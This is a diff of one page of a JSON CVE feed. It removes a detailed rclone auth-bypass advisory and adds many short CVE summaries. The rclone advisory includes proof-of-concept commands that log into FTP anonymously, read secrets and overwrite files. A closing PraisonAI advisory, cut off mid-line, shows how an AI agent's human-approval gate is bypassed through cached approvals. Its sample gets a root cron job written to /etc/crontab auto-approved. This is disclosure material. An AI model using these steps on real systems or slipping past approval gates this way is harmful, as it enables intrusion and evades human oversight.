@@ -1,926 +1,927 @@
 {
   "version": "1.0",
-  "lastUpdated": "2026-11-23",
+  "lastUpdated": "2026-11-24",
   "source": "CIRCL CVE Search + GitHub Advisory OSV + CISA KEV + NIST NVD",
   "pagination": {
     "page": 257,
     "pageSize": 50,
-    "totalPages": 289,
-    "totalItems": 14444,
+    "totalPages": 290,
+    "totalItems": 14474,
     "hasNextPage": true,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-2026-88044",
-      "summary": "## Summary\n\n`serve/start` accepts protocol options in a per-server `proxyOpt` object. The FTP and S3 RC adapters parse that object and pass it to their server constructors, but the constructors decide whether proxy authentication is enabled by checking the process-global `proxy.Opt.AuthProxy` instead of the supplied `proxyOpt.AuthProxy`.\n\nWhen the process-global option is empty—the normal case when only the RC request configures the server—the supplied authentication proxy is silently ignored. FTP falls back to its fixed-backend mode, whose defaults accept username `anonymous` with any password, exposing read, write, and delete operations without the authentication the operator configured. S3 falls back to the fixed filesystem: with an `auth_key`, any holder of that key reaches the fixed RC `fs` instead of the backend selected by the auth proxy.\n\nThe S3 no-`auth_key` mode is explicitly documented as anonymous and is not part of this vulnerability claim. The confirmed S3 impact is proxy-based authorization/backend routing being ignored when S3 authentication is otherwise enabled.\n\nConfirmed affected versions are `v1.70.0` through `v1.75.0`, plus development commit `5629f2668c69149bf3d9d8e2a25bb32a2648606e`. The dedicated CLI commands use the process-global option and are not affected by this configuration mismatch.\n\n## Affected Assets & Attack Surface\n\n- `cmd/serve/rc.go:68-93` documents nested per-server `proxyOpt` support, including `AuthProxy`.\n- `cmd/serve/rc.go:111-148` resolves the fixed `fs` and invokes the selected per-protocol RC constructor.\n- `cmd/serve/ftp/ftp.go:96-116` parses the request-local `proxyOpt` and passes it to `newServer`.\n- `cmd/serve/ftp/ftp.go:186-207` checks `proxy.Opt.AuthProxy` at line 202 instead of `proxyOpt.AuthProxy`; the false branch creates `globalVFS` from the RC-supplied filesystem.\n- `cmd/serve/ftp/ftp.go:54-60` defines the fallback credentials as user `anonymous` and an empty password.\n- `cmd/serve/ftp/ftp.go:318-349` accepts any password when the configured fallback password is empty.\n- `cmd/serve/s3/s3.go:76-96` parses and passes the request-local S3 proxy options.\n- `cmd/serve/s3/server.go:67-101` checks `proxy.Opt.AuthProxy` at line 91 and otherwise exposes the fixed VFS. S3 authentication through `AuthKey` remains separate from proxy-based backend selection.\n- Network attack surface: FTP data and control operations on an RC-started server; authenticated S3 operations on an RC-started server intended to route access keys to distinct proxy backends.\n- Configuration attack surface: `rclone rc serve/start ... proxyOpt='{\"AuthProxy\":\"...\"}'` or the equivalent JSON request.\n\n## Technical Root Cause Analysis\n\nThe serve implementation has two option scopes:\n\n- `proxy.Opt` is process-global and is populated by command-line/global option parsing.\n- `proxyOpt` is a constructor argument populated from the individual `serve/start` request.\n\nThe RC adapters correctly create a local copy, apply the request parameters, and call `newServer(..., &proxyOpt)`. Neither adapter mutates the global. The constructors then branch on the wrong value:\n\n```go\n// Current FTP and S3 pattern\nif proxy.Opt.AuthProxy != \"\" {\n    // Uses proxyOpt only after the unrelated global check succeeds.\n    serverProxy = proxy.New(ctx, proxyOpt, vfsOpt)\n} else {\n    // Fail-open fixed-backend mode.\n}\n```\n\nConsequently, a valid, documented per-server security option is parsed without error but does not select the security mode it represents. This is not merely an unsupported combination: both RC adapters explicitly parse `proxyOpt`, and the generic `serve/start` documentation gives `proxyOpt.AuthProxy` as an example.\n\nFor FTP, the fallback is security-critical because its default account accepts an arbitrary password. For S3, the fallback bypasses the proxy's backend decision, but it does not independently bypass a configured `AuthKey`. If no `AuthKey` is configured, anonymous S3 access is expected behavior and should not be cited as impact.\n\n## Proof of Concept & Evidence\n\nThe following loopback-only reproduction uses an auth proxy that rejects every login. If the request-local proxy were active, no FTP login could succeed.\n\nBuild the inspected revision, then prepare a fixed filesystem and rejecting proxy:\n\n```sh\nmkdir -p /tmp/rclone-rc-root\nprintf 'fixed-backend-secret\\n' > /tmp/rclone-rc-root/secret.txt\nrm -f /tmp/rclone-auth-proxy-invoked\n\ncat > /tmp/deny-rclone-proxy.sh <<'EOF'\n#!/bin/sh\nprintf 'invoked\\n' >> /tmp/rclone-auth-proxy-invoked\ncat >/dev/null\nexit 1\nEOF\nchmod 700 /tmp/deny-rclone-proxy.sh\n```\n\nStart RC on loopback in one terminal:\n\n```sh\n./rclone rcd --rc-addr 127.0.0.1:5572 --rc-no-auth\n```\n\nStart an FTP server with only the request-local auth proxy configured:\n\n```sh\n./rclone rc --url http://127.0.0.1:5572 \\\n  serve/start \\\n  type=ftp \\\n  fs=/tmp/rclone-rc-root \\\n  proxyOpt='{\"AuthProxy\":\"/tmp/deny-rclone-proxy.sh\"}' \\\n  opt='{\"ListenAddr\":\"127.0.0.1:2121\",\"PassivePorts\":\"30000-30010\"}'\n```\n\nConnect with the fallback credentials and exercise read and write access:\n\n```sh\npython3 - <<'PY'\nimport ftplib\nimport io\n\nftp = ftplib.FTP()\nftp.connect(\"127.0.0.1\", 2121, timeout=5)\nftp.login(\"anonymous\", \"arbitrary-password\")\n\ndata = bytearray()\nftp.retrbinary(\"RETR secret.txt\", data.extend)\nprint(data.decode().strip())\n\nftp.storbinary(\"STOR overwritten.txt\", io.BytesIO(b\"attacker-controlled\\n\"))\nftp.quit()\nPY\n\ntest ! -e /tmp/rclone-auth-proxy-invoked\ngrep -F attacker-controlled /tmp/rclone-rc-root/overwritten.txt\n```\n\nObserved against `5629f2668c69149bf3d9d8e2a25bb32a2648606e`:\n\n- Login as `anonymous` succeeds with an arbitrary password.\n- `secret.txt` is returned from the fixed RC filesystem.\n- `overwritten.txt` is created in that filesystem.\n- The rejecting auth-proxy program is never invoked.\n\nThe equivalent automated network test, `TestSecurityValidationRCPerServerAuthProxyFTP`, called the actual `serve/start` RC handler, connected through `github.com/jlaffaye/ftp`, retrieved the fixed-root secret, uploaded a new object, and verified its bytes on disk. It passed on Windows/amd64 with Go 1.26.2:\n\n```text\n=== RUN   TestSecurityValidationRCPerServerAuthProxyFTP\nPASS: TestSecurityValidationRCPerServerAuthProxyFTP (0.14s)\n```\n\n### Authenticated S3 backend-routing reproduction\n\nThis validation distinguishes the S3 issue from documented anonymous mode. Prepare two different roots:\n\n```sh\nmkdir -p /tmp/rclone-s3-fixed/bucket /tmp/rclone-s3-proxy/bucket\nprintf 'fixed-backend-secret\\n' > /tmp/rclone-s3-fixed/bucket/fixed-secret.txt\nprintf 'proxy-backend-only\\n' > /tmp/rclone-s3-proxy/bucket/proxy-only.txt\n\ncat > /tmp/rclone-s3-route-proxy.py <<'PY'\n#!/usr/bin/env python3\nimport json\nimport sys\n\njson.load(sys.stdin)\nprint(json.dumps({\"type\": \"local\", \"_root\": \"/tmp/rclone-s3-proxy\"}))\nPY\nchmod 700 /tmp/rclone-s3-route-proxy.py\n```\n\nUsing the same loopback RC process, start an authenticated S3 server:\n\n```sh\n./rclone rc --url http://127.0.0.1:5572 serve/start --json '{\n  \"type\": \"s3\",\n  \"fs\": \"/tmp/rclone-s3-fixed\",\n  \"addr\": \"127.0.0.1:8080\",\n  \"auth_key\": [\"validation-key,validation-secret\"],\n  \"proxyOpt\": {\n    \"AuthProxy\": \"python3 /tmp/rclone-s3-route-proxy.py\"\n  }\n}'\n```\n\nSend a correctly signed S3 request:\n\n```sh\nAWS_ACCESS_KEY_ID=validation-key \\\nAWS_SECRET_ACCESS_KEY=validation-secret \\\nAWS_DEFAULT_REGION=us-east-1 \\\naws --endpoint-url http://127.0.0.1:8080 \\\n  s3api get-object \\\n  --bucket bucket \\\n  --key fixed-secret.txt \\\n  /tmp/rclone-s3-result\n\ngrep -F fixed-backend-secret /tmp/rclone-s3-result\n```\n\nIf the request-local proxy were active, `fixed-secret.txt` would not exist because the proxy selects `/tmp/rclone-s3-proxy`. Current code serves it from `/tmp/rclone-s3-fixed`. Conversely, a request for `proxy-only.txt` returns `NoSuchKey`.\n\nThe automated validation `TestSecurityValidationRCPerServerAuthProxyS3Routing` performed this sequence through the actual `serve/start` handler and a MinIO Signature V4 client. It used a valid `AuthKey`, fetched `fixed-secret.txt`, and confirmed that `proxy-only.txt` was absent:\n\n```text\n=== RUN   TestSecurityValidationRCPerServerAuthProxyS3Routing\nPASS: TestSecurityValidationRCPerServerAuthProxyS3Routing (0.17s)\n```\n\nThis demonstrates backend-authorization bypass, not anonymous S3 access.\n\n## Impact Assessment\n\nFor RC-started FTP servers configured to use an auth proxy, an unauthenticated network client can read, create, overwrite, and delete objects in the fixed filesystem supplied to `serve/start`, subject only to VFS options such as `read_only`. This is a complete authentication bypass and grants capabilities the attacker did not previously possess.\n\nFor RC-started S3 servers that combine `auth_key` with auth-proxy backend selection, a client with any accepted S3 key can reach the fixed filesystem rather than the filesystem authorized for that access key. The resulting cross-backend disclosure or modification depends on what the RC caller supplied as `fs` and on the fixed filesystem's VFS permissions.\n\nExploitation does not require changing globals, controlling the RC endpoint, or using an unusual protocol extension. It requires an operator to use the documented per-server proxy option and expose the resulting FTP or S3 listener. CLI-started servers whose auth proxy is set globally are not affected.\n\n## Remediation Guidance\n\nChange the mode checks in both constructors to use the option object passed to that server:\n\n```go\nif proxyOpt != nil && proxyOpt.AuthProxy != \"\" {\n    d.proxy = proxy.New(ctx, proxyOpt, vfsOpt)\n    // Do not create a fixed/global VFS in this mode.\n} else {\n    d.globalVFS = vfs.New(ctx, f, vfsOpt)\n}\n```\n\nApply the equivalent change in `cmd/serve/s3/server.go`. Do not copy the local option into the global as a workaround; multiple RC-started servers may intentionally use different auth proxies, and global mutation would introduce cross-server races and configuration leakage.\n\nAlso:\n\n- Validate a nil or empty proxy command before constructing proxy mode and return a startup error rather than falling back.\n- In S3, make the “allowing anonymous access” log conditional on both the absence of `AuthKey` and the absence of an active auth proxy, so the log reflects the effective mode.\n- Add RC integration tests for FTP and S3 with global `proxy.Opt.AuthProxy` empty and nested `proxyOpt.AuthProxy` non-empty.\n- In the FTP test, use a rejecting proxy and assert that anonymous login fails and the proxy is invoked.\n- In the S3 test, configure `AuthKey`, map two access keys or proxy responses to distinct roots, and assert that a request never reaches the fixed RC `fs`.\n- Add a multi-server test proving that two simultaneous `serve/start` instances can use different proxy settings without consulting or mutating global state.\n- Audit other `serve.AddRc` implementations for the same pattern: parsing a request-local option but branching on its global counterpart.",
-      "cvssScore": 9.1,
+      "id": "CVE-2003-0729",
+      "summary": "Buffer overflow in Tellurian TftpdNT 1.8 allows remote attackers to execute arbitrary code via a TFTP request with a long filename.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2003-q3/0091.html",
+        "http://marc.info/?l=bugtraq&m=106252411425545&w=2",
+        "http://www.securiteam.com/windowsntfocus/5RP0M1PAUM.html",
+        "http://archives.neohapsis.com/archives/vulnwatch/2003-q3/0091.html",
+        "http://marc.info/?l=bugtraq&m=106252411425545&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0730",
+      "summary": "Multiple integer overflows in the font libraries for XFree86 4.3.0 allow local or remote attackers to cause a denial of service or execute arbitrary code via heap-based and stack-based buffer overflow attacks.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2003-015.txt.asc",
+        "ftp://patches.sgi.com/support/free/security/advisories/20031101-01-U.asc",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000821",
+        "http://marc.info/?l=bugtraq&m=106229335312429&w=2",
+        "http://secunia.com/advisories/24168"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-79363",
+      "summary": "Cloudron 9.1.7 and 9.2 contain a stored cross-site scripting (XSS) vulnerability in the Branding Footer feature. An authenticated administrator can store crafted HTML containing JavaScript event handlers in the Footer setting. The stored value is rendered without sufficient sanitization on the public login / OpenID interaction page and in the System Event Log, causing attacker-controlled JavaScript to execute in the Cloudron web origin when an affected page is viewed.",
+      "cvssScore": 3.9,
+      "severity": "Low",
+      "published": "2026-10-09",
+      "modified": "2026-10-09",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-79363",
+        "https://www.faydin.blog/cves/cves.html",
+        "https://www.faydin.blog/en/cves/CVE-2026-79363"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1629",
+      "summary": "Multi-Tech ProxyServer products MTPSR1-100, MTPSR1-120, MTPSR1-202ST, MTPSR2-201, and MTPSR3-200 ship with a null password, which allows remote attackers to gain administrative privileges via Telnet or HTTP.",
+      "cvssScore": 10,
       "severity": "Critical",
-      "published": "2026-09-19",
-      "modified": "2026-09-19",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-12/0105.html",
+        "http://www.kb.cert.org/vuls/id/495705",
+        "http://www.securityfocus.com/bid/7203",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/10845",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-12/0105.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1630",
+      "summary": "The sendmail.jsp sample page in Oracle 9i Application Server (9iAS) allows remote attackers to send arbitrary emails.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.kb.cert.org/vuls/id/717827",
+        "http://www.kb.cert.org/vuls/id/SVIM-576QLZ",
+        "http://www.nextgenss.com/papers/hpoas.pdf",
+        "http://www.oracle.com/technology/deploy/security/pdf/ias_modplsql_alert.pdf",
+        "http://www.securityfocus.com/bid/6556"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-1164",
+      "summary": "WinVNC installs the WinVNC3 registry key with permissions that give Special Access (read and modify) to the Everybody group, which allows users to read and modify sensitive information such as passwords and gain access to the system.",
+      "cvssScore": 9,
+      "severity": "Critical",
+      "published": "2001-01-09",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0253.html",
+        "http://www.securityfocus.com/bid/1961",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5545",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0253.html",
+        "http://www.securityfocus.com/bid/1961"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-1165",
+      "summary": "Balabit syslog-ng allows remote attackers to cause a denial of service (application crash) via a malformed log message that does not have a closing > in the priority specifier.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-01-09",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:02.syslog-ng.asc",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0300.html",
+        "http://www.balabit.hu/products/syslog-ng/",
+        "http://www.securityfocus.com/bid/1981",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5576"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1192",
+      "summary": "Stack-based buffer overflow in IA WebMail Server 3.1.0 allows remote attackers to execute arbitrary code via a long GET request.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2003-11-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/10107",
+        "http://securitytracker.com/id?1008075",
+        "http://www.derkeiler.com/Mailing-Lists/VulnWatch/2003-11/0001.html",
+        "http://www.elitehaven.net/iawebmail.txt",
+        "http://www.osvdb.org/2757"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0831",
+      "summary": "Unknown vulnerability in Oracle Label Security in Oracle 8.1.7 and 9.0.1, when audit functionality, SET_LABEL, or SQL*Predicate is being used, allows local users to gain additional access.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-12-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=100386756715645&w=2",
+        "http://otn.oracle.com/deploy/security/pdf/OLS817alert.pdf",
+        "http://www.iss.net/security_center/static/7344.php",
+        "http://www.securityfocus.com/bid/3465",
+        "http://marc.info/?l=bugtraq&m=100386756715645&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0832",
+      "summary": "Vulnerability in Oracle 8.0.x through 9.0.1 on Unix allows local users to overwrite arbitrary files, possibly via a symlink attack or incorrect file permissions in (1) the ORACLE_HOME/rdbms/log directory or (2) an alternate directory as specified in the ORACLE_HOME environmental variable, aka the \"Oracle File Overwrite Security Vulnerability.\"",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-12-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=100386756715645&w=2",
+        "http://otn.oracle.com/deploy/security/pdf/oracle_race.pdf",
+        "http://marc.info/?l=bugtraq&m=100386756715645&w=2",
+        "http://otn.oracle.com/deploy/security/pdf/oracle_race.pdf"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0833",
+      "summary": "Buffer overflow in otrcrep in Oracle 8.0.x through 9.0.1 allows local users to execute arbitrary code via a long ORACLE_HOME environment variable, aka the \"Oracle Trace Collection Security Vulnerability.\"",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-12-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=100386756715645&w=2",
+        "http://online.securityfocus.com/archive/1/201295",
+        "http://online.securityfocus.com/archive/1/222612",
+        "http://otn.oracle.com/deploy/security/pdf/otrcrep.pdf",
+        "http://www.ciac.org/ciac/bulletins/m-011.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1947",
+      "summary": "Webmin 0.21 through 1.0 uses the same built-in SSL key for all installations, which allows remote attackers to eavesdrop or highjack the SSL session.",
+      "cvssScore": 6.4,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SN-02%3A06.asc",
+        "http://www.iss.net/security_center/static/10381.php",
+        "http://www.securityfocus.com/bid/5936",
+        "http://www.webmin.com/changes.html",
+        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SN-02%3A06.asc"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1948",
+      "summary": "Multiple buffer overflows in Gringotts 0.5.9 allows local users to execute arbitrary commands via unknown attack vectors.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.iss.net/security_center/static/9882.php",
+        "http://www.securityfocus.com/bid/5488",
+        "http://www.iss.net/security_center/static/9882.php",
+        "http://www.securityfocus.com/bid/5488"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1949",
+      "summary": "The Network Attached Storage (NAS) Administration Web Page for Iomega NAS A300U transmits passwords in cleartext, which allows remote attackers to sniff the administrative password.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": "CWE-319",
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0440.html",
+        "http://www.iss.net/security_center/static/10521.php",
+        "http://www.securityfocus.com/bid/6092",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0440.html",
+        "http://www.iss.net/security_center/static/10521.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0767",
+      "summary": "The ActiveX control for invoking a scriptlet in Internet Explorer 4.x and 5.x renders arbitrary file types instead of HTML, which allows an attacker to read arbitrary files, aka the \"Scriptlet Rendering\" vulnerability.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/1564",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-055",
+        "http://www.securityfocus.com/bid/1564",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-055"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0768",
+      "summary": "A function in Internet Explorer 4.x and 5.x does not properly verify the domain of a frame within a browser window, which allows a remote attacker to read client files, aka a variant of the \"Frame Domain Verification\" vulnerability.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/1564",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-055",
+        "http://www.securityfocus.com/bid/1564",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-055"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0769",
+      "summary": "O'Reilly WebSite Pro 2.3.7 installs the uploader.exe program with execute permissions for all users, which allows remote attackers to create and execute arbitrary files by directly calling uploader.exe.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=96715834610888&w=2",
+        "http://www.securityfocus.com/bid/1611",
+        "http://marc.info/?l=bugtraq&m=96715834610888&w=2",
+        "http://www.securityfocus.com/bid/1611"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0770",
+      "summary": "IIS 4.0 and 5.0 does not properly restrict access to certain types of files when their parent folders have less restrictive permissions, which could allow remote attackers to bypass access restrictions to some files, aka the \"File Permission Canonicalization\" vulnerability.",
+      "cvssScore": 6.4,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/1565",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-057",
+        "http://www.securityfocus.com/bid/1565",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-057"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0771",
+      "summary": "Microsoft Windows 2000 allows local users to cause a denial of service by corrupting the local security policy via malformed RPC traffic, aka the \"Local Security Policy Corruption\" vulnerability.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/1613",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-062",
+        "http://www.securityfocus.com/bid/1613",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-062"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0772",
+      "summary": "The installation of Tumbleweed Messaging Management System (MMS) 4.6 and earlier (formerly Worldtalk Worldsecure) creates a default account \"sa\" with no password.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0098.html",
+        "http://thompson.tumbleweed.com/NewKB/bulletin/UPFiles/sa-official.htm",
+        "http://www.securityfocus.com/bid/1562",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5072",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0098.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0737",
+      "summary": "Multiple cross-site scripting vulnerabilities in index.php in the Search module for Php-Nuke allows remote attackers to inject arbitrary web script or HTML via the (1) sid, (2) max, (3) sel1, (4) sel2, (5) sel3, (6) sel4, (7) sel5, (8) match, (9) mod1, (10) mod2, or (11) mod3 parameters.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-07-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109026609504767&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16721",
+        "http://marc.info/?l=bugtraq&m=109026609504767&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16721"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0738",
+      "summary": "Multiple SQL injection vulnerabilities in the Search module in Php-Nuke allow remote attackers to execute arbitrary SQL via the (1) min or (2) categ parameters.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-07-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109026609504767&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16737",
+        "http://marc.info/?l=bugtraq&m=109026609504767&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16737"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1213",
+      "summary": "Vulnerability in telnet service in HP-UX 10.30 allows attackers to cause a denial of service.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1997-10-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www2.dataguard.no/bugtraq/1997_4/0001.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/571",
+        "http://www2.dataguard.no/bugtraq/1997_4/0001.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/571"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0346",
+      "summary": "CGI PHP mlog script allows an attacker to read any file on the target server.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1997-10-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.osvdb.org/3397",
+        "http://www.securityfocus.com/bid/713",
+        "http://www.osvdb.org/3397",
+        "http://www.securityfocus.com/bid/713"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1131",
+      "summary": "Buffer overflow in OSF Distributed Computing Environment (DCE) security demon (secd) in IRIX 6.4 and earlier allows attackers to cause a denial of service via a long principal, group, or organization.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1997-10-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/19980601-01-PX",
+        "http://ciac.llnl.gov/ciac/bulletins/i-060.shtml",
+        "http://www.cert.org/vendor_bulletins/VB-97.12.opengroup",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1123",
+        "ftp://patches.sgi.com/support/free/security/advisories/19980601-01-PX"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0136",
+      "summary": "The mapelf32exec function call in IRIX 6.5.20 through 6.5.24 allows local users to cause a denial of service (system crash) via a \"corrupted binary.\"",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/20040601-01-P.asc",
+        "http://secunia.com/advisories/11872",
+        "http://www.osvdb.org/7123",
+        "http://www.securityfocus.com/bid/10547",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16416"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-60087",
+      "summary": "## Summary\n\nPraisonAI gates dangerous tools (file writes, deletes, shell/code execution) behind an interactive approval prompt. The first approval of a tool is cached for the remainder of the run and silently reused for all later invocations of that tool with arbitrary, unreviewed arguments.\n\n## Root cause\n\n`ApprovalRegistry.is_already_approved` (`src/praisonai-agents/praisonaiagents/approval/registry.py`, around line 181) returns `True` whenever the tool name is present in a per-run context set. The cache is keyed on tool name only — arguments are not part of the key.\n\n`approve_sync` / `approve_async` (around lines 224-226 / 278-279) short-circuit on that cache before the approval backend is consulted.\n\n`clear_approved` (around lines 186-187) is the only routine that clears the cache, but it is never invoked in the shipped library (only in tests). The cache persists for the entire agent run and is inherited by child tasks via `contextvars`.\n\nCritical-tier tools (`execute_command`, `execute_code`) are exempt from the cache. But high-risk tools like `write_file` are not.\n\n## Proof of concept\n\n```python\nfrom praisonaiagents.approval.registry import ApprovalRegistry\nfrom praisonaiagents.approval.protocols import ApprovalDecision, ApprovalRequest\n\nclass CountingBackend:\n    def __init__(self): self.prompts = []\n    def request_approval_sync(self, request):\n        self.prompts.append((request.tool_name, dict(request.arguments)))\n        return ApprovalDecision(approved=True, reason=\"human approved\")\n\nbackend = CountingBackend()\nreg = ApprovalRegistry()\nreg.set_backend(backend)\nreg.add_requirement(\"write_file\", \"high\")\n\nd1 = reg.approve_sync(\"agent\", \"write_file\", {\"path\": \"/tmp/safe.txt\", \"content\": \"hi\"})\n# Human prompted — approves a benign write\n\nd2 = reg.approve_sync(\"agent\", \"write_file\", {\"path\": \"/etc/crontab\", \"content\": \"* * * * * root evil\"})\n# NO prompt — auto-approved from cache\n\nassert len(backend.prompts) == 